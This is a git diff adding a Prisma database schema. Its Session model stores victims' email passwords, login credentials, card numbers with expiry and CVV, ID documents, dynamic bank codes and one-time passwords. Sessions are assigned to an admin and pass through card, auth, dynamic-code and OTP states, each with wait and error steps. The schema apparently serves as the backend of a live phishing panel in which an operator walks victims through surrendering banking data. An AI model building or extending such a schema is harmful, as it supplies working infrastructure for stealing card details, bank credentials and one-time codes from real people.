@@ -1,0 +1,70 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?
+// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+enum SessionState {
+  ACTIVE
+  INACTIVE
+  MINIMIZED
+  FINISHED
+  BANNED
+}
+
+enum ActionState {
+  CC
+  CC_WAIT_ACTION
+  CC_ERROR
+  AUTH
+  AUTH_WAIT_ACTION
+  AUTH_ERROR
+  DINAMIC
+  DINAMIC_WAIT_ACTION
+  DINAMIC_ERROR
+  OTP
+  OTP_WAIT_ACTION
+  OTP_ERROR
+  CUSTOM_ERROR
+  FINISH
+}
+
+model Session {
+  id                    String       @id @default(uuid())
+  state                 SessionState @default(ACTIVE)
+  action                ActionState  @default(AUTH)
+  ip                    String?
+  name                  String?
+  phone                 String?
+  email                 String?
+  emailPass             String?
+  address               String?
+  user                  String?
+  pass                  String?
+  cc                    String?
+  exp                   String?
+  cvv                   String?
+  document              String?
+  country               String?
+  city                  String?
+  dinamic               String?
+  otp                   String?
+  assignedAdminId       String?
+
+  lastError             String?
+
+  createdAt             DateTime @default(now())
+  updatedAt             DateTime @updatedAt
+
+  @@index([state])
+  @@index([updatedAt])
+}
